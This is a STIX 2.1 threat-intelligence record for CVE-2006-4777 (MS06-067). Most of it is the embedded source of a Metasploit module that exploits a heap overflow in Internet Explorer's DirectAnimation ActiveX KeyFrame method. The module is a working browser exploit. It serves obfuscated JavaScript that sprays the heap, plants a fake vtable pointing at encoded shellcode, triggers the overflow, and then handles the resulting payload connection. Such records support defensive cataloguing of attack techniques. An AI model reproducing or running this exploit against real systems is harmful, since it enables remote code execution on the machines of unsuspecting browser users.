{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--feb09597-474b-48e3-b88f-313cbae166db",
    "created": "2024-08-14T16:40:28.909432Z",
    "modified": "2024-08-14T16:40:28.909436Z",
    "name": "MS06-067 Microsoft Internet Explorer Daxctle.OCX KeyFrame Method Heap Buffer Overflow Vulnerability",
    "description": " This module exploits a heap overflow vulnerability in the KeyFrame method of the direct animation ActiveX control.  This is a port of the exploit implemented by Alexander Sotirov.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_067_keyframe.rb",
            "external_id": "ms06_067_keyframe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4777"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n\n  #\n  # Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"6.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:classid    => 'DirectAnimation.PathControl',\n  #\t:method     => 'KeyFrame',\n  #\t:rank       => NormalRanking  # reliable memory corruption\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-067 Microsoft Internet Explorer Daxctle.OCX KeyFrame Method Heap Buffer Overflow Vulnerability',\n      'Description'    => %q{\n        This module exploits a heap overflow vulnerability in the KeyFrame method of the\n        direct animation ActiveX control.  This is a port of the exploit implemented by\n        Alexander Sotirov.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          # Did all the hard work\n          'Alexander Sotirov <asotirov[at]determina.com>',\n          # Integrated into msf\n          'skape',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-4777' ],\n          [ 'OSVDB', '28842' ],\n          [ 'BID', '20047' ],\n          [ 'MSB', 'MS06-067' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          # Maximum payload size is limited by heaplib\n          'Space'       => 870,\n          'MinNops'     => 32,\n          'Compat'      =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000/XP/2003 Universal', { }],\n        ],\n      'DisclosureDate' => '2006-11-14',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n\n    # This is taken directly from Alex's exploit -- all credit goes to him.\n    trigger_js = heaplib(\n      \"var target = new ActiveXObject('DirectAnimation.PathControl');\\n\" +\n      \"var heap = new heapLib.ie();\\n\" +\n      \"var shellcode = unescape('#{Rex::Text.to_unescape(p.encoded)}');\\n\" +\n      \"var jmpecx = 0x4058b5;\\n\" +\n      \"var vtable = heap.vtable(shellcode, jmpecx);\\n\" +\n      \"var fakeObjPtr = heap.lookasideAddr(vtable);\\n\" +\n      \"var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) + heap.padding(14/2);\\n\" +\n      \"heap.gc();\\n\" +\n      \"for (var i = 0; i < 100; i++)\\n\" +\n      \"  heap.alloc(vtable)\\n\" +\n      \"heap.lookaside(vtable);\\n\" +\n      \"for (var i = 0; i < 100; i++)\\n\" +\n      \"  heap.alloc(0x2010)\\n\" +\n      \"heap.freeList(fakeObjChunk, 2);\\n\" +\n      \"target.KeyFrame(0x40000801, new Array(1), new Array(1));\\n\" +\n      \"delete heap;\\n\")\n\n    # Obfuscate it up a bit\n    trigger_js = obfuscate_js(trigger_js,\n      'Symbols' =>\n        {\n          'Variables' => [ 'target', 'heap', 'shellcode', 'jmpecx', 'fakeObjPtr', 'fakeObjChunk' ]\n        })\n\n    # Fire off the page to the client\n    send_response(cli,\n      \"<html><script language='javascript'>#{trigger_js}</script></html>\")\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-14",
    "x_mitre_platforms": [
        "win'"
    ]
}